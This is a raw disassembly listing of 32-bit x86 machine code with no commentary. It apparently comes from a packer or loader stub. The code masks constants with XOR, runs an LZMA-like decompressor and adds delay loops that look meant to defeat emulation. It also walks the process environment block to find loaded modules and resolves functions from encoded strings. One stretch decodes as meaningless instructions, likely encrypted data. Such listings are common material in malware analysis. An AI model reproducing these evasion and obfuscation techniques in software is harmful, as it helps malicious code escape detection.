  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
